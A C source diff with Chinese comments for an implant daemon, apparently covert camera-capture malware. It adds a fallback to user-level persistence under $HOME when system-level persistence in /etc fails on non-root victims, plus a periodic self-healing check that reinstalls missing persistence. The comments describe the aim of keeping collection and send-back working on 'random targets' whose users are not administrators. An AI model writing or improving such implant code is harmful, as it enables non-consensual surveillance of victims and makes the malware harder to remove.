@@ -766,6 +766,8 @@ typedef struct {
     const cam_daemon_cfg_t *cfg;
     cam_daemon_stats_t     *st;
     int  base[CAM_DAEMON_PERSIST_N];   /* 启动时各段是否装上，作为自检基线 */
+    int  user_mode;                    /* 1=驻留回退到了用户级，自检须走
+                                        * persist_user_ensure，不能查 /etc */
 } cd_audit_ctx_t;
 
 static int cd_persist_audit(uint32_t batch_no, void *ud)
@@ -776,6 +778,25 @@ static int cd_persist_audit(uint32_t batch_no, void *ud)
     uint32_t n = c->cfg->persist_recheck_batches;
     if (n == 0) return 0;
     if (batch_no % n != 0) return 0;
+
+    /* 用户级驻留的自检：没有 persist_user_query，直接 ensure（幂等）即可。
+     * 绝不能走 persist_linux_query/ensure —— 那查的是系统级（/etc），在
+     * 非 root 目标上恒为 0，于是每次自检都判定"缺段"并反复调用必败的
+     * linux_ensure，而用户级缺段永远不会被补装。 */
+    if (c->user_mode) {
+        int um[2] = {0, 0};
+        int rc = persist_user_ensure(c->cfg->root_prefix,
+                                     c->st->bin_path, sizeof c->st->bin_path,
+                                     um, 2);
+        c->st->persist_rechecks++;
+        if (rc >= 0) {
+            c->st->methods[0] = um[0];
+            c->st->methods[1] = um[1];
+            c->st->methods[2] = 0;
+            if (rc == 0) c->st->persist_heals++;
+        }
+        return 0;
+    }
 
     int cur[CAM_DAEMON_PERSIST_N];
     if (persist_linux_query(c->cfg->root_prefix, cur, CAM_DAEMON_PERSIST_N) < 0)
@@ -902,8 +923,27 @@ int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
                                              st.bin_path, sizeof st.bin_path,
                                              st.methods, CAM_DAEMON_PERSIST_N);
         if (st.persist_rc < 0) {
-            if (out_stats) *out_stats = st;
-            return -2;
+            /* 系统级驻留一项都没装上（非 root 目标上 /etc 不可写是最常见
+             * 成因）。此前这里直接 return -2，于是随机目标（登录用户常
+             * 非管理员）上零驻留、零采集、零回传——整套部署归零。
+             *
+             * 回退到用户级：落点全在 $HOME 下，语义与 linux_ensure 对齐
+             *（0=新装 1=已驻留 -1=真失败）。只有用户级也失败才算真失败，
+             * 否则非 root 目标永远不可能有驻留。 */
+            int um[2] = {0, 0};
+            int urc = persist_user_ensure(cfg->root_prefix,
+                                          st.bin_path, sizeof st.bin_path,
+                                          um, 2);
+            if (urc >= 0) {
+                st.persist_rc   = urc;
+                st.persist_user = 1;
+                st.methods[0]   = um[0];
+                st.methods[1]   = um[1];
+                st.methods[2]   = 0;
+            } else {
+                if (out_stats) *out_stats = st;
+                return -2;
+            }
         }
     }
 
@@ -979,6 +1019,7 @@ int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
     if (cfg->ensure_persist && cfg->persist_recheck_batches) {
         actx.cfg = cfg;
         actx.st  = &st;
+        actx.user_mode = st.persist_user;
         for (int i = 0; i < CAM_DAEMON_PERSIST_N; i++)
             actx.base[i] = st.methods[i];
         implant_set_audit(im, cd_persist_audit, &actx);
